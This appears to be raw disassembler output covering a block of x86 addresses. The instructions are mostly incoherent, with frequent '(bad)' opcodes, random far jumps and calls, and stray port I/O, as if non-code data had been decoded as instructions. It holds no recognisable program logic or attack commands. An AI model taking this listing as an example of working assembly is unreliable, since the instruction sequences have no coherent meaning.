  420bd6:	outs   dx,DWORD PTR ds:[esi]
  420bd7:	mov    cl,0x31
  420bd9:	jmp    0x420bf0
  420bdb:	in     al,0xf
  420bdd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420bde:	dec    edi
  420bdf:	pop    ds
  420be0:	xchg   esp,eax
  420be1:	and    bl,BYTE PTR [esi-0xbe5b448]
  420be7:	ds dec ecx
  420be9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420bea:	pcmpgtw mm5,mm3
  420bed:	outs   dx,BYTE PTR ds:[esi]
  420bee:	or     eax,0x9374a829
  420bf3:	xchg   esi,eax
  420bf4:	xchg   edx,eax
  420bf5:	data16 loopne 0x420b89
  420bf8:	mov    esi,0xc358e260
  420bfd:	pop    edi
  420bfe:	mov    DWORD PTR [eax],ebp
  420c00:	ins    DWORD PTR es:[edi],dx
  420c01:	outs   dx,BYTE PTR ds:[esi]
  420c02:	es xchg esp,eax
  420c04:	jo     0x420bf8
  420c06:	loope  0x420bf7
  420c08:	sbb    DWORD PTR [ebp+0xdd382d6],ebx
  420c0e:	dec    esp
  420c0f:	and    edx,DWORD PTR [edx]
  420c11:	cs test eax,0x948364b8
  420c17:	xor    BYTE PTR [eax],dh
  420c19:	retf   
  420c1a:	or     DWORD PTR [ecx],ebx
  420c1c:	(bad)  
  420c1d:	ret    0xf160
  420c20:	call   0x368c9f08
  420c25:	or     dh,cl
  420c27:	mov    ebp,eax
  420c29:	fist   DWORD PTR [edx]
  420c2b:	mov    eax,0xe7e7cb83
  420c30:	(bad)  
  420c31:	jecxz  0x420c7a
  420c33:	gs out 0x49,al
  420c36:	push   esi
  420c37:	add    BYTE PTR [ebp+esi*2+0x12],ch
  420c3b:	loope  0x420cb4
  420c3d:	arpl   WORD PTR [esi+ecx*8-0x650b9935],bp
  420c44:	addr16 hsubps xmm0,xmm0
  420c49:	aas    
  420c4a:	push   ebx
  420c4b:	and    DWORD PTR [edx-0x725f3089],esp
  420c51:	sub    dl,BYTE PTR [edx+0x5b]
  420c54:	dec    esi
  420c55:	push   edi
  420c56:	dec    ebp
  420c57:	rol    DWORD PTR [ebx+ebx*1+0x68726b50],cl
  420c5e:	test   eax,0x20b6c367
  420c63:	test   eax,0x120f5557
  420c68:	mov    esp,0x32adc84b
  420c6d:	inc    edi
	...
  420cd6:	mov    dl,BYTE PTR ds:0xbf9fb10b
  420cdc:	mov    edx,0x1886e3f
  420ce1:	in     eax,0xe6
  420ce3:	mov    cl,0xd1
  420ce5:	dec    ecx
  420ce6:	addr16 pusha 
  420ce8:	add    DWORD PTR [eax],eax
  420cea:	add    BYTE PTR [ecx],al
  420cec:	add    BYTE PTR [eax],al
  420cee:	adc    DWORD PTR [ebp+0x20],edi
  420cf1:	and    al,0x7a
  420cf3:	add    ecx,DWORD PTR ds:0xdd3be1e3
  420cf9:	or     DWORD PTR [ebp+0xa2626e2],0xffffffef
  420d00:	js     0x420d39
  420d02:	cmp    al,0x1
  420d04:	icebp  
  420d05:	jmp    0x420d0d
  420d07:	xchg   BYTE PTR [eax*2+0x36f1b63f],dh
  420d0e:	fcomp  DWORD PTR [ebx+0x23]
  420d11:	imul   edx,DWORD PTR [edi-0x60],0xffffffd6
  420d15:	mov    BYTE PTR [ebp-0x70],bl
  420d18:	pusha  
  420d19:	outs   dx,DWORD PTR ds:[esi]
  420d1a:	inc    ebp
  420d1b:	xor    eax,0x25bf9325
  420d20:	push   eax
  420d21:	sbb    bl,BYTE PTR [ebx+0x7af431f4]
  420d27:	xchg   edx,eax
  420d28:	push   eax
  420d29:	sub    ebp,edi
  420d2b:	mov    ch,0xb2
  420d2d:	fldcw  WORD PTR [edx-0x45]
  420d30:	(bad)  
  420d32:	in     eax,dx
  420d33:	sti    
  420d34:	ror    BYTE PTR [eax],1
  420d36:	pusha  
  420d37:	int    0xd
  420d39:	out    dx,eax
  420d3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d3b:	stos   DWORD PTR es:[edi],eax
  420d3c:	dec    eax
  420d3d:	(bad)  
  420d3e:	in     eax,0xa9
  420d40:	inc    esi
  420d41:	jbe    0x420db3
  420d43:	fwait
  420d44:	inc    eax
  420d45:	sub    dh,BYTE PTR [ebx]
  420d47:	mov    eax,ds:0xf4b024fc
  420d4c:	int3   
  420d4d:	imul   esp,eax,0x383319c
  420d53:	jl     0x420daa
  420d55:	pushf  
  420d56:	push   esi
  420d57:	pusha  
  420d58:	jb     0x420d15
  420d5a:	add    eax,0x93d92b16
  420d5f:	jb     0x420d1e
  420d61:	sub    BYTE PTR [edi-0x6654feea],ah
  420d67:	inc    edx
  420d68:	repnz inc esp
  420d6a:	or     al,0xc0
  420d6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d6d:	ja     0x420d4f
  420d6f:	inc    esp
  420d70:	cli    
  420d71:	sub    dh,BYTE PTR [ebx+0x3501a7e9]
  420d77:	push   0x74
  420d79:	mov    bl,BYTE PTR [eax+0x6736eb46]
  420d7f:	lahf   
  420d80:	or     edi,DWORD PTR [esp+eax*1]
  420d83:	pop    es
  420d84:	adc    DWORD PTR [ecx-0x37],0x72
  420d88:	cdq    
  420d89:	pop    ecx
  420d8a:	mov    cl,0x56
  420d8c:	and    DWORD PTR [ebp-0x7],edx
  420d8f:	rcr    DWORD PTR [ebp-0x5a373441],cl
  420d95:	adc    al,0x71
  420d97:	addr16 stc 
  420d99:	push   ebx
  420d9a:	dec    eax
  420d9b:	sar    esp,1
  420d9d:	lahf   
  420d9e:	enter  0x2be,0x47
  420da2:	dec    eax
  420da3:	scas   al,BYTE PTR es:[edi]
  420da4:	mov    cl,0xdb
  420da6:	ror    DWORD PTR [ebx-0x70],0x72
  420daa:	mov    eax,0x499e9571
  420daf:	out    dx,al
  420db0:	test   al,0xdf
  420db2:	or     DWORD PTR [ecx-0x478c81d1],edx
  420db8:	cld    
  420db9:	clc    
  420dba:	mov    bh,0x24
  420dbc:	imul   ecx,DWORD PTR [edx-0x17],0x924dbd18
  420dc3:	daa    
  420dc4:	fild   WORD PTR [ecx+0xfba821c]
  420dca:	mov    eax,0xded386eb
  420dcf:	out    0x4c,eax
  420dd1:	add    BYTE PTR [esp+edx*2],cl
  420dd4:	add    BYTE PTR [esi+0x57],ah
  420dd7:	sub    eax,0xbf4384a4
  420ddc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420ddd:	dec    edi
  420dde:	sbb    esi,0x15
  420de1:	pusha  
  420de2:	cld    
  420de3:	and    al,0x59
  420de5:	jecxz  0x420dfd
  420de7:	xchg   ebx,eax
  420de8:	pop    eax
  420de9:	mov    esp,ebp
  420deb:	repz fidivr WORD PTR [edi+0x0]
	...
  420e53:	add    BYTE PTR [eax],al
  420e55:	add    bh,ah
  420e57:	push   ds
  420e58:	into   
  420e59:	push   0x9fe7f8ff
  420e5e:	push   esi
  420e5f:	inc    edi
  420e60:	lahf   
  420e61:	mov    al,ds:0xca54af18
  420e66:	addr16 popa 
  420e68:	add    DWORD PTR [eax],eax
  420e6a:	add    BYTE PTR [ecx],al
  420e6c:	add    BYTE PTR [eax],al
  420e6e:	and    eax,0x9c2495af
  420e73:	and    esp,DWORD PTR [ebx-0x3a]
  420e76:	add    ebx,DWORD PTR [ebp-0x51637fc6]
  420e7c:	stos   BYTE PTR es:[edi],al
  420e7d:	sub    BYTE PTR [esi-0x76],ah
  420e80:	dec    ebx
  420e81:	mov    cl,0xb4
  420e83:	push   0xe4579372
  420e88:	xchg   esi,eax
  420e89:	repz call 0xfb6f:0x5bd3ae24
  420e91:	or     DWORD PTR [eax+eax*1+0x539004c3],edi
  420e98:	mov    edi,0x38b13ac1
  420e9d:	dec    ebx
  420e9e:	cmp    eax,0x5df01f1a
  420ea3:	out    0x89,eax
  420ea5:	not    BYTE PTR [eax-0x68]
  420ea8:	sahf   
  420ea9:	int3   
  420eaa:	mov    edi,0xc4f7a3e9
  420eaf:	pop    ss
  420eb0:	rcl    DWORD PTR [esi+eiz*1],0x81
  420eb4:	sbb    al,0xc3
  420eb6:	loopne 0x420e5b
  420eb8:	lds    ebp,FWORD PTR [eax+0x13fdac46]
  420ebe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ebf:	or     DWORD PTR [esi-0x2e],edx
  420ec2:	call   0x3329:0x83500cbb
  420ec9:	cmp    al,dl
  420ecb:	(bad)  
  420ecc:	mov    al,0xdf
  420ece:	sti    
  420ecf:	jno    0x420f40
  420ed1:	or     al,0x28
  420ed3:	add    esp,DWORD PTR [edi]
  420ed5:	and    edi,0xffffffa9
  420ed8:	pop    esp
  420ed9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420eda:	mov    ecx,0x3224afed
  420edf:	and    BYTE PTR [ebp-0x1f36ab46],dl
  420ee5:	rcr    ebx,1
  420ee7:	idiv   DWORD PTR [esp+edx*2-0x21541f8]
  420eee:	jb     0x420e84
  420ef0:	lods   al,BYTE PTR ds:[esi]
  420ef1:	jae    0x420f58
  420ef3:	adc    ch,bh
  420ef5:	mov    al,0xbf
  420ef7:	fst    DWORD PTR [edx-0x107d3e14]
  420efd:	inc    ebx
  420efe:	mov    ch,0x24
  420f00:	cmp    al,0x80
  420f02:	shr    BYTE PTR ds:0x408f65bf,0x8d
  420f09:	fstp   DWORD PTR [eax]
  420f0b:	mov    dl,bl
  420f0d:	fxch   st(6)
  420f0f:	hlt    
  420f10:	mov    bh,ah
  420f12:	xchg   esp,eax
  420f13:	cmp    esp,ebp
  420f15:	mov    DWORD PTR [esi],esp
  420f17:	lea    ebx,[edx-0x6b]
  420f1a:	jno    0x420f39
  420f1c:	cmp    ch,BYTE PTR [edx+0x7e]
  420f1f:	xchg   BYTE PTR [ebx],al
  420f21:	es or  dl,ah
  420f24:	jecxz  0x420f8f
  420f26:	jecxz  0x420f12
  420f28:	in     eax,dx
  420f29:	xchg   ebp,eax
  420f2a:	out    0xb4,eax
  420f2c:	dec    ebx
  420f2d:	adc    bh,ah
  420f2f:	pop    ss
  420f30:	leave  
  420f31:	jl     0x420f00
  420f33:	aas    
  420f34:	jecxz  0x420eb6
  420f36:	ffree  st(2)
  420f38:	mov    bh,0x3
  420f3a:	ins    DWORD PTR es:[edi],dx
  420f3b:	test   BYTE PTR [ebx],0xab
  420f3e:	sub    ah,BYTE PTR [eax+0x31e84750]
  420f44:	fld    TBYTE PTR [ebx+0x62]
  420f47:	in     al,dx
  420f48:	inc    edi
  420f49:	xlat   BYTE PTR ds:[ebx]
  420f4a:	mov    WORD PTR [eax-0x2],ss
  420f4d:	mov    bh,0x51
  420f4f:	inc    ebx
  420f50:	enter  0xcdb5,0x3b
  420f54:	inc    ecx
  420f55:	xchg   esi,eax
  420f56:	sub    eax,0xdae9c088
  420f5b:	ret    0xb7f5
  420f5e:	js     0x420f20
  420f60:	or     BYTE PTR [ebx-0x363b5fe7],ch
  420f66:	and    ebx,DWORD PTR [esi-0x36]
  420f69:	adc    BYTE PTR [ecx+0x3a],cl
  420f6c:	fcom   DWORD PTR [edx]
	...
  420fd6:	and    BYTE PTR [edi-0x28082cbe],dl
  420fdc:	mov    cl,0xf7
  420fde:	jg     0x420fcd
  420fe0:	or     esp,DWORD PTR [esi-0x39835cd]
  420fe6:	bound  eax,QWORD PTR [bx+di]
  420fe9:	add    BYTE PTR [eax],al
  420feb:	add    DWORD PTR [eax],eax
  420fed:	add    BYTE PTR [ebx+0x3c],cl
  420ff0:	jge    0x421020
  420ff2:	xchg   BYTE PTR [ecx-0x4c118c57],ch
  420ff8:	jecxz  0x420fbd
  420ffa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ffb:	imul   edi,DWORD PTR [edi+0x37],0xf3889f21
  421002:	je     0x420fa4
  421004:	mov    edi,0xc5d9fb89
  421009:	cmp    dh,ah
  42100b:	in     al,dx
  42100c:	dec    esp
  42100d:	and    al,0xc2
  42100f:	mov    eax,0x450e1fba
  421014:	sti    
  421015:	in     al,dx
  421016:	push   ds
  421017:	xchg   ebp,eax
  421018:	jle    0x420fa7
  42101a:	inc    edi
  42101b:	dec    eax
  42101c:	pushf  
  42101d:	mov    ds,WORD PTR [edi]
  42101f:	mov    eax,edx
  421021:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421022:	adc    al,0xd
  421024:	or     eax,0xc1b88c7b
  421029:	test   DWORD PTR [edi+0x40d11052],ebx
  42102f:	int3   
  421030:	mov    WORD PTR [eax+ebx*1+0x2b],ds
  421034:	inc    edi
  421035:	add    BYTE PTR [ecx-0x716b9178],bh
  42103b:	das    
  42103c:	xor    DWORD PTR [eax+0x7151bd1f],eax
  421042:	int3   
  421043:	loopne 0x42102e
  421045:	arpl   WORD PTR [ebx-0x53],sp
  421048:	popf   
  421049:	or     al,0xeb
  42104b:	les    edi,FWORD PTR [edi+0x30d82681]
  421051:	or     esp,ecx
  421053:	xor    eax,0x3ac3146a
  421058:	add    DWORD PTR [ebx+esi*8-0x68c55843],esi
  42105f:	xchg   edi,eax
  421060:	xchg   edi,eax
  421061:	sbb    dl,BYTE PTR [ebp+0x40a9185a]
  421067:	mov    dh,cl
  421069:	ds cdq 
  42106b:	in     eax,dx
  42106c:	sub    edx,DWORD PTR ss:[esi]
  42106f:	and    ebx,DWORD PTR [edx-0xe285c2c]
  421075:	or     DWORD PTR [esi],edi
  421077:	add    ecx,ecx
  421079:	pop    es
  42107a:	xor    cl,bh
  42107c:	jno    0x421073
  42107e:	cwde   
  42107f:	rol    dl,1
  421081:	mov    edi,0xd0645aed
  421086:	aam    0xc5
  421088:	dec    ebx
  421089:	in     eax,dx
  42108a:	ja     0x4210f7
  42108c:	cmp    ebp,ebx
  42108e:	out    dx,eax
  42108f:	lods   eax,DWORD PTR ds:[esi]
  421090:	sahf   
  421091:	call   eax
  421093:	rcl    DWORD PTR [ebp-0xa],cl
  421096:	jbe    0x42102f
  421098:	retf   
  421099:	jns    0x421114
  42109b:	xor    eax,0x598292a5
  4210a0:	nop
  4210a1:	pusha  
  4210a2:	mov    bl,0x47
  4210a4:	js     0x421039
  4210a6:	out    0x45,al
  4210a8:	idiv   edx
  4210aa:	and    BYTE PTR [eax-0x70],cl
  4210ad:	and    esi,DWORD PTR [edi+0x29]
  4210b0:	jmp    0x4210f4
  4210b2:	xchg   DWORD PTR ds:0xaa7f2e3c,edx
  4210b8:	and    edi,DWORD PTR [eax]
  4210ba:	mov    DWORD PTR ds:0xf57480a,0x4d75efc5
  4210c4:	jle    0x42104b
  4210c6:	xor    DWORD PTR [ebx],0x8feabd34
  4210cc:	rol    BYTE PTR ds:0x1c40f207,0xa6
  4210d3:	mov    dh,0x55
  4210d5:	pop    ecx
  4210d6:	xchg   edx,eax
  4210d7:	inc    ebx
  4210d8:	idiv   DWORD PTR [ebp+0x549aabad]
  4210de:	or     edx,esi
  4210e0:	mov    BYTE PTR [ebp+0x23],dl
  4210e3:	fwait
  4210e4:	inc    esp
  4210e5:	add    BYTE PTR [esi-0x654ef545],0x92
  4210ec:	xor    ah,al
	...
  421156:	lahf   
  421157:	pop    esi
  421158:	fcmovb st,st(6)
  42115a:	fcmovnb st,st(6)
  42115c:	lahf   
  42115d:	pop    edi
  42115e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42115f:	jne    0x421143
  421161:	mov    ?,WORD PTR [edx+0x64]
  421164:	cmp    eax,0x1636723
  421169:	add    BYTE PTR [eax],al
  42116b:	add    DWORD PTR [eax],eax
  42116d:	add    ah,ch
  42116f:	stos   BYTE PTR es:[edi],al
  421170:	cdq    
  421171:	mov    eax,ds:0x9d489b30
  421176:	push   0x920d2755
  42117b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42117c:	in     eax,dx
  42117d:	jmp    0x1f8a:0x678387f3
  421184:	inc    edi
  421185:	ds int 0x10
  421188:	push   edi
  421189:	mov    eax,ds:0xc3571853
  42118e:	mov    ch,ch
  421190:	mov    bl,0x87
  421192:	mov    dh,BYTE PTR [edx-0x630248fa]
  421198:	sbb    al,0x11
  42119a:	stos   BYTE PTR es:[edi],al
  42119b:	test   BYTE PTR [ebx-0x1b46aa50],dh
  4211a1:	int    0xac
  4211a3:	int3   
  4211a4:	xor    eax,0x6e2ac957
  4211a9:	scas   eax,DWORD PTR es:[edi]
  4211aa:	test   al,0xcc
  4211ac:	(bad)  
  4211ad:	jo     0x4211ff
  4211af:	dec    esi
  4211b0:	mov    ds:0x93368d03,al
  4211b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4211b6:	fiadd  DWORD PTR [eax+0x75]
  4211b9:	sbb    DWORD PTR [edi+ebx*8-0x7c848379],0xffffff92
  4211c1:	lahf   
  4211c2:	outs   dx,DWORD PTR ds:[esi]
  4211c3:	js     0x421207
  4211c5:	or     al,0x9a
  4211c7:	jg     0x4211d5
  4211c9:	iret   
  4211ca:	and    bl,BYTE PTR [ecx+0x4d35f197]
  4211d0:	enter  0xc4ce,0x88
  4211d4:	inc    ebp
  4211d5:	jg     0x421187
  4211d7:	push   esp
  4211d8:	dec    eax
  4211d9:	outs   dx,DWORD PTR ds:[esi]
  4211da:	aas    
  4211db:	mov    ds:0xd5aa7346,eax
  4211e0:	outs   dx,DWORD PTR ds:[esi]
  4211e1:	push   es
  4211e2:	mov    ecx,0x57914949
  4211e7:	imul   eax,DWORD PTR [ecx+0x2d],0x8
  4211eb:	mov    DWORD PTR [eax-0x30067b44],edi
  4211f1:	or     esp,DWORD PTR [ecx]
  4211f3:	imul   ebx,DWORD PTR [edi],0x40724b1a
  4211f9:	xchg   ecx,eax
  4211fa:	loopne 0x421252
  4211fc:	loope  0x4211c3
  4211fe:	mov    esp,0xbdac2132
  421203:	pop    ds
  421204:	pop    eax
  421205:	sub    bl,bl
  421207:	mov    edx,0xfb99afd
  42120c:	add    al,0x7d
  42120e:	out    dx,al
  42120f:	push   0x78
  421211:	fisttp DWORD PTR [edi+0x2d17ebe1]
  421217:	gs cld 
  421219:	push   esi
  42121a:	dec    esi
  42121b:	outs   dx,BYTE PTR ds:[esi]
  42121c:	dec    ebp
  42121d:	push   es
  42121e:	retf   0x21d3
  421221:	ins    DWORD PTR es:[edi],dx
  421222:	fistp  DWORD PTR [ebx]
  421224:	jl     0x4212a0
  421226:	sti    
  421227:	neg    DWORD PTR [esi+0x1d]
  42122a:	(bad)  
  42122c:	jle    0x4211cd
  42122e:	aam    0x8b
  421230:	xor    DWORD PTR [ebx+0x7cea6f23],esi
  421236:	push   edx
  421237:	dec    edi
  421238:	outs   dx,DWORD PTR ds:[esi]
  421239:	xchg   esp,eax
  42123a:	mov    dh,0xed
  42123c:	das    
  42123d:	lock in al,dx
  42123f:	inc    ecx
  421240:	iret   
  421241:	ds call 0xc633:0x82cd3175
  421249:	scas   eax,DWORD PTR es:[edi]
  42124a:	sbb    BYTE PTR [eax],0x82
  42124d:	popf   
  42124e:	inc    esp
  42124f:	mov    ch,0xc9
  421251:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421252:	xor    esp,eax
  421254:	ret    0x5ad8
  421257:	shl    ah,cl
  421259:	sbb    eax,0x51f87a5c
  42125e:	adc    bl,BYTE PTR [edi+0x3b]
  421261:	jae    0x421205
  421263:	inc    ecx
  421264:	test   edx,esi
  421266:	add    eax,0x2899f42d
  42126b:	or     bh,BYTE PTR [ecx]
  42126d:	out    dx,eax
	...
  4212d6:	sahf   
  4212d7:	pop    ds
  4212d8:	(bad)  
  4212d9:	test   DWORD PTR [edi-0x42800109],0x67ab32d
  4212e3:	int    0xf7
  4212e5:	and    BYTE PTR [edi+0x64],ah
  4212e8:	add    DWORD PTR [eax],eax
  4212ea:	add    BYTE PTR [ecx],al
  4212ec:	add    BYTE PTR [eax],al
  4212ee:	mov    ch,0x65
  4212f0:	iret   
  4212f1:	mov    ch,0x43
  4212f3:	pop    eax
  4212f4:	data16 sahf 
  4212f6:	(bad)  
  4212f7:	xchg   ecx,eax
  4212f8:	sar    BYTE PTR [eax+0x587038],cl
  4212fe:	call   0xb98317c0
  421303:	pop    edx
  421304:	push   esi
  421305:	das    
  421306:	and    BYTE PTR [ebx-0x5d030c53],al
  42130c:	imul   esi,edx,0x5e4cbf26
  421312:	das    
  421313:	loopne 0x421366
  421315:	pop    ebp
  421316:	or     dh,BYTE PTR [ecx+ebx*8]
  421319:	daa    
  42131a:	cmp    ebx,DWORD PTR [esi+0x6d09675c]
  421320:	cld    
  421321:	sbb    bl,al
  421323:	imul   DWORD PTR [ebx]
  421325:	xchg   edi,eax
  421326:	cdq    
  421327:	xor    al,0x42
  421329:	cs mov eax,0x7460eabf
  42132f:	cdq    
  421330:	rol    BYTE PTR [edx],0xa6
  421333:	call   0xe5e8:0x366b752c
  42133a:	rol    BYTE PTR [ecx+0x7c065ac7],cl
  421340:	repnz xchg esi,eax
  421342:	ret    
  421343:	sub    ecx,DWORD PTR [esi]
  421345:	xlat   BYTE PTR ds:[ebx]
  421346:	adc    edi,DWORD PTR gs:[edi]
  421349:	aad    0xa5
  42134b:	push   cs
  42134c:	dec    eax
  42134d:	stos   BYTE PTR es:[edi],al
  42134e:	test   BYTE PTR ds:0xb851b33c,al
  421354:	add    al,dl
  421356:	aas    
  421357:	arpl   di,cx
  421359:	xor    cl,cl
  42135b:	call   0x1c1e:0x28583def
  421362:	fild   QWORD PTR [eax+0x44f3510a]
  421368:	push   0x7b
  42136a:	aam    0x4d
  42136c:	inc    edi
  42136d:	xchg   DWORD PTR [edx-0x46],edx
  421370:	or     BYTE PTR [ecx-0x2abc4fac],ch
  421376:	test   al,0xff
  421378:	xor    eax,0x9808d564
  42137d:	jmp    FWORD PTR [eax+0x3f]
  421380:	mov    al,ds:0x726ad794
  421385:	xchg   bh,ch
  421387:	inc    eax
  421388:	cli    
  421389:	call   0xcd6250a5
  42138e:	out    0x64,eax
  421390:	jge    0x421376
  421392:	mov    ?,eax
  421394:	jo     0x4213be
  421396:	or     esp,DWORD PTR [esi+esi*2]
  421399:	cmp    DWORD PTR [esp+ecx*8+0x53e7b55e],edx
  4213a0:	jns    0x421344
  4213a2:	jnp    0x42132d
  4213a4:	imul   esp,esi,0x8d9dbdf8
  4213aa:	fisubr DWORD PTR [ecx-0x6f1a02b1]
  4213b0:	and    eax,0xbaebc42a
  4213b5:	dec    ecx
  4213b6:	push   edi
  4213b7:	sbb    ebp,ecx
  4213b9:	daa    
  4213ba:	xchg   DWORD PTR [esi-0x6fdfe370],ecx
  4213c0:	pop    ss
  4213c1:	or     al,BYTE PTR [edi+0x2e80766e]
  4213c7:	xor    cl,bl
  4213c9:	jns    0x42135d
  4213cb:	push   ss
  4213cc:	clc    
  4213cd:	mov    esp,0xdd06afc5
  4213d2:	stos   DWORD PTR es:[edi],eax
  4213d3:	mov    ds:0x1a4493d,al
  4213d8:	adc    BYTE PTR [eax],0xd
  4213db:	data16 icebp 
  4213dd:	jp     0x421457
  4213df:	js     0x421460
  4213e1:	ins    BYTE PTR es:[edi],dx
  4213e2:	push   ebp
  4213e3:	stos   DWORD PTR es:[edi],eax
  4213e4:	add    esi,esi
  4213e6:	ret    0x487d
  4213e9:	xchg   edx,eax
  4213ea:	ret    
  4213eb:	fstp   QWORD PTR [ebp+0xf]
	...
  421456:	inc    bh
  421458:	pop    esp
  421459:	mov    eax,ds:0xdfffbb7d
  42145e:	fstp   DWORD PTR [ebp-0x4d090b61]
  421464:	lea    esp,cs:[edi+0x65]
  421468:	add    DWORD PTR [eax],eax
  42146a:	add    BYTE PTR [ecx],al
  42146c:	add    BYTE PTR [eax],al
  42146e:	xchg   DWORD PTR [edi+0x35],edi
  421471:	int3   
  421472:	(bad)  
  421474:	std    
  421475:	lea    esp,[eax-0x34187b1a]
  42147b:	xchg   al,ah
  42147d:	or     eax,0x11c3956a
  421482:	push   0xdf673e7a
  421487:	lds    ecx,FWORD PTR [ecx]
  421489:	rcr    edx,1
  42148b:	xchg   dh,ch
  42148d:	push   esi
  42148e:	(bad)  
  42148f:	xchg   ebp,eax
  421490:	mov    al,0xa1
  421492:	iret   
  421493:	adc    BYTE PTR [ecx],dh
  421495:	mov    ah,0xcd
  421497:	pop    esp
  421498:	mov    ah,0xdd
  42149a:	imul   ebp,esi,0xd
  42149d:	into   
  42149e:	cmp    DWORD PTR [ebp-0x7d072afc],esp
  4214a4:	sbb    al,0xae
  4214a6:	jl     0x42144e
  4214a8:	dec    ebx
  4214a9:	rol    ecx,0xf7
  4214ac:	inc    esp
  4214ad:	cmp    eax,0x34e880e8
  4214b2:	jmp    0x421525
  4214b4:	dec    ebx
  4214b5:	mov    ch,0x43
  4214b7:	ret    
  4214b8:	xchg   ebp,eax
  4214b9:	and    DWORD PTR [edx+0x67],esi
  4214bc:	push   ss
  4214bd:	fcomp  DWORD PTR [eax]
  4214bf:	jb     0x421521
  4214c1:	in     eax,dx
  4214c2:	aas    
  4214c3:	inc    ecx
  4214c4:	inc    esi
  4214c5:	pop    ecx
  4214c6:	and    BYTE PTR [esi],bh
  4214c8:	sub    DWORD PTR [esi],ebp
  4214ca:	mov    eax,0xf15818ad
  4214cf:	sub    eax,0xdbbb7257
  4214d4:	mov    WORD PTR [ecx-0x38],?
  4214d7:	(bad)  
  4214d8:	pop    edx
  4214d9:	loopne 0x421474
  4214db:	mov    edx,0xcdba568
  4214e0:	aas    
  4214e1:	and    al,0xf2
  4214e3:	adc    DWORD PTR [ecx+ebx*8+0x34],edx
  4214e7:	sub    ebx,edx
  4214e9:	shr    DWORD PTR [edi],1
  4214eb:	jo     0x4214bf
  4214ed:	sar    BYTE PTR [ecx+0x4d],1
  4214f0:	add    DWORD PTR [ebp-0x7a],ebp
  4214f3:	outs   dx,BYTE PTR ds:[esi]
  4214f4:	stos   BYTE PTR es:[edi],al
  4214f5:	retf   
  4214f6:	mov    ch,0x1b
  4214f8:	fs pop di
  4214fb:	add    eax,0x8b20aeef
  421500:	retf   0xbe4b
  421503:	mov    ebx,0x30dcc721
  421508:	or     eax,0xb9efb269
  42150d:	ds jl  0x4214a1
  421510:	adc    eax,0x6dcae503
  421515:	ds popf 
  421517:	pop    ds
  421518:	mov    ah,0x2a
  42151a:	and    bl,ah
  42151c:	shr    DWORD PTR [edi],1
  42151e:	stc    
  42151f:	out    0xd2,al
  421521:	imul   esi,DWORD PTR [ebp+0x6d],0x3f
  421525:	loopne 0x42158b
  421527:	hlt    
  421528:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421529:	pop    ecx
  42152a:	sub    al,0xb0
  42152c:	in     al,0x6
  42152e:	pushf  
  42152f:	lods   al,BYTE PTR ds:[esi]
  421530:	test   eax,0x79e8ff2
  421535:	inc    esi
  421536:	jmp    0x89f0:0xa4cfd47b
  42153d:	ds jns 0x421505
  421540:	int    0x75
  421542:	fsub   DWORD PTR [esi]
  421544:	popf   
  421545:	ret    
  421546:	int3   
  421547:	(bad)  
  421548:	test   eax,0x33e67a58
  42154d:	enter  0xc947,0x82
  421551:	jbe    0x42154e
  421553:	or     eax,0x5335b5f4
  421558:	neg    BYTE PTR [ebx+eax*1+0x7fcc3b8a]
  42155f:	xchg   esp,eax
  421560:	push   edx
  421561:	mov    ebx,eax
  421563:	fsubr  DWORD PTR [ecx]
  421565:	in     al,dx
  421566:	jle    0x421587
  421568:	cs std 
  42156a:	xchg   DWORD PTR [esi-0x27],esp
  42156d:	rol    BYTE PTR [eax],1
	...
  4215d3:	add    BYTE PTR [eax],al
  4215d5:	add    dh,dl
  4215d7:	repnz test BYTE PTR [eax],bl
  4215da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4215db:	jle    0x4215bb
  4215dd:	(bad)  
  4215de:	arpl   WORD PTR [eax-0x2c36bd4c],bp
  4215e4:	jne    0x4215ca
  4215e6:	add    WORD PTR [bx+si],ax
  4215ea:	add    BYTE PTR [ecx],al
  4215ec:	add    BYTE PTR [eax],al
  4215ee:	jno    0x4215d2
  4215f0:	dec    ebx
  4215f1:	sbb    al,0x6f
  4215f3:	test   esi,0x51aefb7e
  4215f9:	lds    ecx,FWORD PTR [ebx+0x2544dc01]
  4215ff:	sar    BYTE PTR [eax+0x6306d98b],1
  421605:	addr16 mov ds,ecx
  421608:	pop    ss
  421609:	add    al,dh
  42160b:	ins    DWORD PTR es:[edi],dx
  42160c:	dec    ecx
  42160d:	jmp    0xb2af:0x90c71119
  421614:	aaa    
  421615:	xchg   esp,eax
  421616:	pop    edi
  421617:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421618:	mov    ds:0xf4b3ec5e,al
  42161d:	add    esp,DWORD PTR [ebx+0x11c4e2dc]
  421623:	add    DWORD PTR [eax],ebx
  421625:	mov    dl,0x73
  421627:	lods   eax,DWORD PTR ds:[esi]
  421628:	xchg   ecx,eax
  421629:	js     0x421611
  42162b:	mov    bl,0xe4
  42162d:	in     eax,0x51
  42162f:	nop
  421630:	ret    0xb5c7
  421633:	jmp    0x72b0e24c
  421638:	int    0x1e
  42163a:	popf   
  42163b:	inc    ecx
  42163c:	loopne 0x421607
  42163e:	loope  0x4215d9
  421640:	std    
  421641:	inc    eax
  421642:	pop    ss
  421643:	push   ss
  421644:	js     0x4216c4
  421646:	inc    eax
  421647:	popf   
  421648:	mov    esi,0x706284d2
  42164d:	or     bl,ah
  42164f:	outs   dx,BYTE PTR ds:[esi]
  421650:	sub    BYTE PTR [ebx-0x1],al
  421653:	ret    0x122f
  421656:	call   0x11fe6e43
  42165b:	test   eax,0x5b32f5bf
  421660:	xor    al,0x2d
  421662:	cmp    al,0x5b
  421664:	xchg   ecx,eax
  421665:	sbb    DWORD PTR [bp+si-0xf47],ecx
  42166a:	daa    
